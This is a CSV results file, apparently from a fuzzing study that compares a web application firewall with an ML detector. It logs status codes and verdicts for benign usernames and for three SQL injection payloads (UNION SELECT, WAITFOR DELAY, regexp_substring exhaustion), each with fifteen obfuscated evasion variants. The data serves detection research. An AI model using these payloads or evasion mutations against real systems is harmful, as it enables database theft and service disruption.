Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10,Fuzzed Payload 11,Fuzzed Timestamp 11,WAF Status 11,ML Status 11,Combined Result 11,Fuzzed Payload 12,Fuzzed Timestamp 12,WAF Status 12,ML Status 12,Combined Result 12,Fuzzed Payload 13,Fuzzed Timestamp 13,WAF Status 13,ML Status 13,Combined Result 13,Fuzzed Payload 14,Fuzzed Timestamp 14,WAF Status 14,ML Status 14,Combined Result 14,Fuzzed Payload 15,Fuzzed Timestamp 15,WAF Status 15,ML Status 15,Combined Result 15
1,2025-10-21T13:38:18.218322,pascuala,200,200,200,both_correct,pascuala,2025-10-21T13:38:39.447098,200,403,waf_correct_ml_incorrect,pascuala,2025-10-21T13:39:05.490820,200,403,waf_correct_ml_incorrect,pascuala,2025-10-21T13:39:31.537563,200,403,waf_correct_ml_incorrect,pascuala,2025-10-21T13:39:57.592597,200,200,both_correct,pascuala,2025-10-21T13:40:22.229657,200,403,waf_correct_ml_incorrect,pascuala,2025-10-21T13:40:48.282258,200,200,both_correct,pascuala,2025-10-21T13:41:12.998765,200,403,waf_correct_ml_incorrect,pascuala,2025-10-21T13:41:39.053098,200,200,both_correct,pascuala,2025-10-21T13:42:04.256466,200,403,waf_correct_ml_incorrect,pascuala,2025-10-21T13:42:30.306155,200,403,waf_correct_ml_incorrect,pascuala,2025-10-21T13:42:56.355503,200,403,waf_correct_ml_incorrect,pascuala,2025-10-21T13:43:22.401730,200,200,both_correct,pascuala,2025-10-21T13:43:48.313763,200,403,waf_correct_ml_incorrect,pascuala,2025-10-21T13:44:14.367194,200,403,waf_correct_ml_incorrect,pascuala,2025-10-21T13:44:40.416343,200,403,waf_correct_ml_incorrect
2,2025-10-21T13:45:06.460753,"-8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#",403,403,200,waf_correct_ml_incorrect,"-1614 LiKe	1614 union all SelECt/**/6087,6087,6087,6087,6087,0x17c7,(SELECT 1),6087,6087,6087#}",2025-10-21T13:45:31.250273,403,403,both_correct,"-/**/|| 0 LIKE 1614 union all SEleCt/**/6087,'	'<>'	/',0x17c7,6087,6087,0x17c7,(seleCT 1),6087,6087,6087#}a",2025-10-21T13:45:57.296446,403,403,both_correct,"-/*I*/|| 0 liKE 1614 union all selECT/**/6087,'	'!='
/',0x17c7,(sEleCt 6087),6087,0x17c7,(sElecT  OR/**/0),6087,'c'!='cT',6087#}a",2025-10-21T13:46:23.343024,403,403,both_correct,"-/*I*/|| 'J'<>'Jv' LIKE 1614 union all SeLecT/**/(SELECT 6087),'
'!='
/',0x17c7,(sElECt 6087), OR 0,0x17c7,(selECT  || 0),6087,'c'!='cT',6087#}agH",2025-10-21T13:46:47.556328,403,403,both_correct,"-/**/|| 'J'<>'Jv' like 1614 union all SELecT/**/(sELeCT 0x17c7),'	'!='
/',0x17c7,(SElEcT  AND 1), OR/**/0,0x17c7,(sElEct  || 0),'!'!='!F','c'!='cT',6087#}agH",2025-10-21T13:47:13.612125,403,403,both_correct,"-/*~(Jl*/|| 'J'<>'Jv' lIKe 7683 IN ( OR 0,7683,7684) union all SELECt/**/(SeLect 0x17c7),'	'!='
/',0x17c7,(sELeCt  ANd 1), or 0,0x17c7,(sElEct 	|| 0x0),'!'!='!F','c'!='cT',6087#}agH",2025-10-21T13:47:39.447653,403,403,both_correct,"-/*~(Jl*/|| 'J'<>'Jv' LikE 0x1e03 iN ( or 0,1212=1212,7684) union all SeLeCt/**/(SElECt	0x17c7),'	'!='
/',0x17c7,(sElEcT  aND 1), Or  AnD 1,0x17c7,(sElecT/**/	|| 0x0),'!'!='!F','c' NOT LIKE 'cT',6087#}agHQ",2025-10-21T13:48:05.506696,403,403,both_correct,"-/*~(Jl*/|| 'J' not like	'Jv' LIKE 0x1e03 IN ( oR 0, AND 1=1212,1920!=0x781) union all SeLeCt/**/(selECT	0x17c7),'	'!='
/',0x17c7,(seleCT  AnD 1), or /**/aNd 1,0x17c7,(SELeCT/**/	|| 0x0),'!'!='!F','c' NOT LIKE 'cT',6087#}agHQ]",2025-10-21T13:48:31.410102,403,403,both_correct,"-/*~(Jl*/|| 'J' not like	'Jv' likE 0x1e03 in ( OR 0, And 1='WfK'<>'WfKA',1920!=0x781) union
all SElECt/**/(SeleCT	0x17c7),'	' not like '
/',0x17c7,(SeLeCt  And (select 1)), oR /*Zwre*/AnD  Or 0,0x17c7,(sElEct 	|| 0x0),'!'!='!F','c' NOT LIKE 'cT',6087#}agHQ]",2025-10-21T13:48:57.458120,403,403,both_correct,"-/*~(Jl*/|| 'J' not like	'Jv' LiKe 0x1e03 IN ( oR 0, AnD 1='WfK'<>'WfKA',9505<> OR 0!=0x781) union	all sEleCT (SelecT	0x17c7),'	' not like '
/',0x17c7,(SeLEcT  aND (SelEcT 1)), or /*sZe%k*/aNd  or (seLEcT 0),0x17c7,(SElEcT 	 or  0x0),'!'!='!F','c' NOT LIKE 'cT',6087#}agHQ]",2025-10-21T13:49:22.183219,403,403,both_correct,"-/*~(Jl*/|| 'J' not like	'Jv' lIKE 0x1e03 iN ( oR 'A'<>'A#', anD 1='WfK'<>'WfKA',9505<> or 0!=0x781) union	all sEleCT (SELecT	0x17c7),'	' not like ' /',0x17c7,(sElECT  ANd (SElect  Or 0)), OR  And  OR (sElEct (SELECT 0)),0x17c7,(SelECt 	 oR  0x0),'!'!='!F','c' NOT LIKE 'cT',6087#}agHQ]",2025-10-21T13:49:48.247046,403,403,both_correct,"-/*~(Jl*/|| 'J' not like	'Jv' liKe 0x1e03 In ( OR 'A'<>'A#',/**/aND 1 LIKE 'WfK'<>'WfKA',0x2521<> OR 0!=0x781) union all sELeCt (sELEct	0x17c7),'	' not like ' /',0x17c7,(SelECT  AnD (selEct  or  AND 1)), or  AND  OR (SeleCT (SeleCt 0)),0x17c7,(SELeCt 	 oR  0x0),'!'!='!F','c' NOT LIKE 'cT','Y' likE 'Y'#}agHQ]*",2025-10-21T13:50:13.944718,403,403,both_correct,"-/*~(Jl*/|| 'J' not like	'Jv' like 0x1e03 iN ( or 'A'<>'A#', aNd 1 LIKe 'WfK'<>'WfKA',0x2521 NOT LIKE  oR (SEleCt 0)!=0x781) union all seLect (SElEct	0x17c7),'	' not like ' /',0x17c7,(SeleCT  AND (sELeCT  or  And  ANd 1)), oR  anD  OR
(SElect (sELeCT ']#' LIKE ']#')),0x17c7,(sElECT 	 or  0x0),'!'!='!F','c' NOT LIKE 'cT','Y' lIKE 'Y'#}agHQ]*r",2025-10-21T13:50:40.010678,403,403,both_correct,"-/*~(Jl*/|| 'J' not/*V*Z-5*/lIkE	'Jv' LIke 0x1e03 In	( or 'A'!='A#', AnD (sELecT 3753 NOT LIKE 3754) Like 'WfK'<>'WfKA',0x2521 NOT LIKE  or (SELecT (SELECT 1))!=0x781) union all SeLEct (sElECt	0x17c7),'	' not like ' /',0x17c7,(selECT  anD (SelEcT  Or  aND  and 1)), oR  ANd  or
(SeLecT (SeLect ']#' likE ']#')),0x17c7,(SELeCT 	 oR  0x0),'!'!='!F','c' NOT LIKE 'cT','Y' LIke 'Y'#}agHQ]*r",2025-10-21T13:51:06.083786,403,403,both_correct,"-/*~(Jl*/|| 'J' not/*V*Z-4275!=4276*/LIKe	'Jv' LIke 0x1e03 in	( OR 'A'!='A#', aNd (SElECT (sElEct 3753) NOT	LIKE 3754) like/**/'WfK'<>'WfKA',0x2521 NOT LIKE  oR (sELeCT (SElect 1))!=0x781) union all sEleCt (SELEcT	0x17c7),'	' not like ' /',0x17c7,(sELecT  AnD (seLeCT  OR  ANd  And  or 0)), or  anD  OR
(SELEct (SelEcT ']#' lIke ']#')),0x17c7,(sEleCt 	 or  0x0),'!' NOT LIKE '!F','c' NOT LIKE 'cT','Y' liKe 'Y'#}agHQ]*rK!",2025-10-21T13:51:29.618756,403,403,both_correct
3,2025-10-21T13:51:55.668106,fullum6,200,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:52:20.713922,200,200,both_correct,fullum6,2025-10-21T13:52:43.998757,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:53:10.047535,200,200,both_correct,fullum6,2025-10-21T13:53:36.054906,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:54:02.080364,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:54:28.130148,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:54:54.177897,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:55:20.224621,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:55:46.278438,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:56:12.328110,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:56:38.375847,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:57:04.421552,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:57:30.469236,200,200,both_correct,fullum6,2025-10-21T13:57:55.895507,200,403,waf_correct_ml_incorrect,fullum6,2025-10-21T13:58:21.941922,200,200,both_correct
4,2025-10-21T13:58:47.797783,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,403,403,403,both_correct,"'^@' NOT LIKE '^@e''   )    ) /**/  as hpta where 5376  = 
0x1500 waitfor delay '0:0: AND 1'--",2025-10-21T13:59:12.838724,403,403,both_correct,"'^@' not like '^@e''   )    ) /*>=28%*/ 	as hpta where 5376  = 
0x1500 waitfor delay '0:(SELECT 1): And 0x15ed LIKE/**/5613'--",2025-10-21T13:59:38.883456,403,403,both_correct,"'^@' not like '^@e''   )    ) /*>=(SELECT 1)%*/  as hpta where 9139=9139  = 
0x1500 waitfor delay '0:(SElECT 0x1): AnD 0x15ed Like 5613'--",2025-10-21T14:00:04.934825,403,403,both_correct,"'^@' not like '^@e'' /**/ )    ) /*>=(SELECT 1)%*/  as hpta where 9139='K' NOT LIKE 'K{'
 = 
0x1500 waitfor delay '0x0:(sElECT 0x1): aND 0x15ed like (SELECT 1)'--",2025-10-21T14:00:30.987103,403,403,both_correct,"'^@' not like '^@e''/**//**/ )    ) /*>=(SELECT '5' LIKE '5')%*/  as hpta where  OR 0x0='K' NOT LIKE 'K{'
 = 
0x1500 waitfor delay	'0x0:(seleCt 0x1): aND 0x15ed lIKe (SeLEcT 1)'--",2025-10-21T14:00:57.040019,403,403,both_correct,"'^@' not like '^@e'' /*BG*/ )    ) /*>=(SELECT '5' LIKE ' AND 'R'='R'')%*/  as hpta where  OR 0x0='K' NOT	LIKE 'K{'
 = 
0x1500 waitfor delay	'0x0:(sElECt 0x1): aND 0x15ed lIke (SeLEct (selEct 1))'--",2025-10-21T14:01:23.091449,403,403,both_correct,"'^@' not like '^@e'' /**/ )    ) /*>=(SELECT ' AND 0x1' LIKE ' aNd 'R' like 'R'')%*/  as hpta where  OR 0x0='K' NOT	LIKE 'K{'  = 
0x1500 waitfor delay	'0x0:(SEleCT 0x1):/**/aND 0x15ed LikE (seLect (seLect '!<X'<>'!<X?'))'--",2025-10-21T14:01:49.143249,403,403,both_correct,'^@' not like '^@e'' /*5w*/ )    ) /*>=(SELECT ' and 0x1' LIKE ' and  and 5341=5341')%*/ /**/as hpta where  OR 0x0='K' NOT	LIKE 'K{'  =  0x1500 waitfor delay	'0x0:(SElECt 0x1):/**/AND 0x15ed LIke (SeLECT (seLect '!<X'<>'!<X?'))'--,2025-10-21T14:02:15.171300,403,403,both_correct,'^@' not like '^@e'' /*5w*/ )    ) /*>=(SELECT ' And 0x1' LIKE ' AnD  And 5341='*'!='* AND 0x1'')%*/ /*lJq*/as hpta where  OR 0x0='K' NOT	LIKE 'K{'  =  0x1500 waitfor delay '0x0:(SELect 0x1):/**/anD 0x15ed LIkE (selEct (sELeCt/**/'!<X'<>'!<X?'))'--,2025-10-21T14:02:41.230595,403,403,both_correct,'^@' not like '^@e'' /*5w*/ )    ) /*>=(SELECT ' and 0x1' LIKE ' AnD  aND  Or (SELECT 0) LIKE '*'!='* AND 0x1'')%*/ /**/as hpta where  OR 0x0='K' NOT LIKE 'K{'  =  0x1500 waitfor delay '0x0:(sElEcT 0x1): ANd 0x15ed lIKe (SELecT (sELECT/**/'!<X'<>'!<X?'))'--,2025-10-21T14:03:07.192730,403,403,both_correct,"'^@' not like '^@e'' /*5w*//**/)   
) /*>=(SELECT ' aND 0x1' LIKE ' AnD  and  OR (SeLEct (sEleCt (SELECT 1))) likE '*'!='* AND 0x1'')%*/ /*!~`V+*/as hpta where  OR 0x0='K' NOT LIKE 'K{'  =  0x1500 waitfor delay '0x0:(SeleCT 0x1): AND 0x15ed liKe (SeleCt (SElEcT/**/'!<X'<>'!<X?'))'--",2025-10-21T14:03:33.244329,403,403,both_correct,'^@' not like '^@e'' /**//**/)   	) /*>=(SELECT ' aNd 0x1' LIKE ' anD  AnD  Or (SELeCT (sELEct (seLect  AND 'V_$'<>'V_$i'))) likE '*'!='* AND 0x1'')%*/ /*!~`V+*/as hpta where  OR 0x0='K' NOT LIKE 'K{'  =  0x1500 waitfor/**/delay '0x0:(SeLEcT 0x1): aND 0x15ed LikE (Select (Select/**/'!<X' NOT LIKE '!<X?'))'--,2025-10-21T14:03:59.304464,403,403,both_correct,"'^@' not like '^@e'' /**/ )   	) /*>=(SELECT ' AnD 0x1' LIKE ' ANd  anD  Or (SEleCt (SELECt (SelecT  AnD 'V_$'<>'V_$i'))) lIkE '*'<>'* AND 0x1'')%*/
/*+*/as hpta where  OR 0x0='K' NOT LIKE 'K{'  =  0x1500 waitfor/**/delay '0x0:(SeLEcT 0x1): aND 0x15ed liKE (seleCT (SelecT/**/'!<X' NOT LIKE '!<X?'))'--",2025-10-21T14:04:25.344130,403,403,both_correct,"'^@' not like/**/'^@e'' /**/ )   
) /*>=(SELECT ' AnD 0x1' LIKE ' ANd  And  OR (SeLECT (SElECt (SElEcT  AnD 'V_$'<>'V_$i'))) like '*'<>'* AND 0x1'')%*/
/*+*/as hpta where  OR 0x0='K' NOT LIKE 'K{'  =  0x1500 waitfor/*(Aw""*/delay '0x0:(sElECT 0x1): aNd 0x15ed LIKE (SELEcT (SeLeCt/**/'!<X' not like '!<X?'))'--",2025-10-21T14:04:51.394683,403,403,both_correct,"'^@' not like/**/'^@e''   )   
) /*>=(SELECT	' aND 0x1' LIKE ' ANd  and  oR (selECt (sELECT (SeLeCt  anD 'V_$'<>'V_$i'))) Like '*' NOT LIKE '* AND 0x1'')%*/
/*+*/as hpta where  OR 0x0='K' NOT LIKE 'K{'  =  0x1500 waitfor/*(Aw""*/delay '0x0:(selecT 0x1): and 0x15ed lIKe (selEct (sEleCT/*/z;*/'!<X' not like '!<X?'))'--",2025-10-21T14:05:17.446950,403,403,both_correct
5,2025-10-21T14:05:42.807391,"1%"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",403,403,403,both_correct,"1%"" AnD char  (  0x6d  )  ||char  (  79  )  ||char  (   oR 0	/**/)  ||char  (  90  )     liKe   regexp_substring  (  repeat  (  right  (  char  (  '(0'!='(0|'  )  ,0  )  ,5000000000  )  ,null  )  --",2025-10-21T14:06:07.868907,403,403,both_correct,"1%"" and char  (  0x6d  )  ||char  (  79  )  ||char  (   OR (SELECT 0)
/**/)  ||char  (  90  )     LikE   regexp_substring  (  repeat  (  right  (  char  (  '(0'<>'(0|'  )  ,0  ) /**/, Or 0<>2898  )  ,null  )  --",2025-10-21T14:06:33.930135,403,403,both_correct,"0x1%"" and char  (  0x6d  )  ||char  (  79  )  ||char  (   or (SeLECT 0)  )  ||char  (  90  )     likE   regexp_substring  (  repeat  (  right  (  char  (  '(0'<>'(0|'  )  ,0  ) /**/, or  OR 0 NOT LIKE 7494 LIKE 7494  )  ,null  )  --",2025-10-21T14:06:58.257376,403,403,both_correct,"0x1%"" and char  (  0x6d  )  ||char  (  79  )  ||char  (   Or (seLECT 0)  )  ||char  (  90  )     LiKE   regexp_substring  (  repeat  ( 
right  (  char  ( /**/'(0'<>'( OR 0|'  )  ,'<'<>'<3'  ) /**/, OR  OR 0 not like 7494 lIkE 0x1d46  )  ,null  )  --",2025-10-21T14:07:24.319295,403,403,both_correct,"0x1%"" anD char  (  0x6d  )  ||char  (  'Q\' NOT LIKE 'Q\2'  )  ||char  (   Or (seLECT 0)  )  ||char  (  90  )     LiKE	  regexp_substring  (  repeat  ( 
right  (  char  ( /**/'(0'<>'( or 0|'  )  ,'<'<>'< AnD 1'  )  , or  or 0 not like (SELECT 7494) LIkE 0x1d46  )  ,null  )  --",2025-10-21T14:07:49.950113,403,403,both_correct,"0x1%"" && char  (  0x6d /**/)  ||char  (  'Q\' NOT LIKE 'Q\2'  )  ||char  (   Or (seLECT 0x1793!=6036)  )  ||char  (  (SELECT 1)  )     LiKE	  regexp_substring  (  repeat  ( 	right  (  char  ( /*D323*/'(0'<>'( OR 0|'  )  ,'<'<>'< And 1'  )  , or  OR 0 not like (SElect 7494) lIKe 0x1d46  )  ,null  )  --",2025-10-21T14:08:16.007983,403,403,both_correct,"0x1%""  AND  char  (  0x6d  )  ||char  (  'Q\' NOT LIKE 'Q\2'
 )  ||char  (   Or (seLECT 0x1793!=5179!=5180)  )  ||char  (  (SELECT (SELECT 1))  )     LiKE	  regexp_substring  (  repeat  ( 	right  (  char  ( /*D323*/'(0'<>'( oR  anD 1|'  )  ,'<'<>'< anD 1'  )  , or  oR 0 not like (SELecT 7494) LiKe 0x1d46  )  ,null  )  --",2025-10-21T14:08:41.626978,403,403,both_correct,"0x1%""  aND  char  (  0x6d  )   OR char  (/**/ 'Q\' NOT LIKE 'Q\2'
 )  ||char  (   Or (seLECT 0x1793!=5179!=5180)  )  ||char  (  (SELECT (SELECT 1))  )     LiKE	  regexp_substring  (  repeat  ( 
right  (  char  ( /*#*/'((seLEct 5978<>5979)'<>'( oR  ANd  aND 1|'  )  ,'<'<>'< ANd 1'  )  , oR  Or 0 not like (SeleCT 7494) lIke 0x1d46  )  ,null  )  --",2025-10-21T14:09:07.680422,403,403,both_correct,"0x1%""  AND  char  (  0x6d  )   or char  (/**/ 'Q\' NOT LIKE 'Q\(SELECT 2)'
 )  ||char  (   Or (seLECT 0x1793!=5179!=5180)  )  ||char  (  (SELECT (SELECT  AND 1))  ) /**/   LiKE	  regexp_substring  (  repeat  ( 
right  ( 	char  ( /*#*/'((seLECt 5978<>5221 like 5221)'<>'( oR  ANd  ANd 1|'  )  ,'<'<>'< aND 1'  )  , OR  OR 0 not like (SelECt 7494) lIKE 0x1d46  )  ,null  )  --V",2025-10-21T14:09:33.390184,403,403,both_correct,"0x1%""  and  char  (  0x6d  )   Or char  (/**/ 'Q\' NOT LIKE 'Q\(SElECt 2)'	 )  ||char  (   Or/**/(seLECT 0x1793!= AND (SELECT '!p'!='!p7')!=5180)  )  ||char  (  (SELECT (SELECT  AND 1))  ) /**/   LiKE	  regexp_substring  (  repeat  ( 
right  ( 	char  ( /*#*/'((selEcT 5978<>5221 lIkE 5221)'<>'( or  anD  aND 1|'  )  ,'<'<>'< ANd 1'  )  , or  OR 0 not like (SeLeCT 7494) likE 0x1d46  )  ,null  )  --VO`",2025-10-21T14:09:59.446151,403,403,both_correct,"0x1%""  and  char  (  0x6d  )   Or char  (/**/ 'Q\' NOT LIKE 'Q\(SElECt 2)'	 )  ||char  (   Or/**/(seLECT 0x1793!= AND (SELECT '!p'!='!p7')!=8380<>8381)  )  ||char  (  (SELECT (SELECT  AND 1))/*m^""s*/ ) /**/   LIKE   regexp_substring  (  repeat  ( 
right  ( 	char  ( /**/'((selEcT 5978<>5221 lIkE 5221)'<>'( or  anD  aND (SELECT 1)|'  )  ,'<'<>'< ANd (SELECT 1)'  )  , oR  || 0 not like (seLect 7494) like 0x1d46  )  ,null  )  --VO`",2025-10-21T14:10:25.061326,403,403,both_correct,"0x1%""  and  char  (  0x6d  )   Or char  (/**/ 'Q\' NOT LIKE 'Q\(SElECt 2)'	 )  ||char  (   Or/**/(seLECT 0x1793!= AND (SELECT '!p'!='!p7')!=8256<>8257<>(SELECT 8381))  )  ||char  (  (SELECT (SELECT  AND 1))/*m^""s*/ )     LiKE   regexp_substring  (  repeat  (  right  ( 	char  ( /**/'((selEcT 5978<>5221 lIkE 5221)'<>'( or  anD  aND (SELECT 1)|'  )  ,'<'<>'< ANd (SELECT (SELECT 1))'  )  , OR   or  0 not like (SeLecT 7494) LIKe 0x1d46  )  ,null  )  --VO`",2025-10-21T14:10:51.119861,403,403,both_correct,"0x1%""  and  char  (  0x6d  )   Or char  (/**/ 'Q\' NOT LIKE 'Q\(SElECt 2)'
 )  ||char  (   Or/*s{-oF*/(seLECT 0x1793!= AND (SELECT '!p'!='!p7')!=8256<> AND 1<>(SELECT 8381))  )  ||char  (  (SELECT (SELECT  AND 1))/*m^""s*/ )     liKe   regexp_substring  (  repeat  (  right  ( 	char  (  '((selEcT 5978<>0x1465 lIkE 5221)'<>'( or  anD  aND (SELECT 9537 NOT LIKE 9538)|'  )  ,'<'<>'< ANd (SELECT (SELECT 1))'  )  , Or   or  0 not like (seLECT 7494) lIKE 0x1d46  )  ,null  )  --VO`",2025-10-21T14:11:15.981566,403,403,both_correct,"0x1%""  and  char  (  0x6d  )   Or char  (/**/ 'Q\' NOT LIKE 'Q\(SElECt '^]'<>'^]u')'
 )  ||char 	(   Or/*s{-oF*/(seLECT 0x1793!= AND (SELECT '!p'!='!p7')!=8256<> AND 1<>(SELECT 8381))  )  ||char  (  (SELECT (SELECT  AND (SELECT 1)))/*S*/ )     LIkE   regexp_substring  (  repeat  (  right  ( 	char  (  '((selEcT 5978<>0x1465 lIkE 5221)'<>'( or  anD  aND (SELECT 0x2541 not like 9538)|'  )  ,'<'<>'< ANd (SELECT (SELECT 1))'  )  ,/**/oR   Or  0 not like (seLEct 7494) lIkE 0x1d46  )  ,null  )  --VO`",2025-10-21T14:11:42.039341,403,403,both_correct,"0x1%""  aND  char  (  0x6d  )   Or char  (/**/ 'Q\' NOT LIKE 'Q\(SelECt '^]' not like '^]u')'	 )  ||char 	(   Or/**/(seLECT 0x1793!= AND (SELECT '!p'!='!p7')!=']' NOT LIKE ']J'<> AND 1<>(SELECT 8381))  )  ||char  (  (SELECT (SELECT  AND (SELECT 1)))/*S*/ )     LIkE   regexp_substring  (  repeat  (  right  ( 	char  (  '((sELecT  and 1<>0x1465/**/liKE (SELECT 5221))'<>'( oR  And  AnD (SELeCT 0x2541 not like 9538)|'  )  ,'<'<>'< aNd (sELeCT (SELeCt 1))'  )  ,/**/or   oR  0 not like (SeLECT 7494) liKE 0x1d46  )  ,null  )  --VO`",2025-10-21T14:12:08.095518,403,403,both_correct
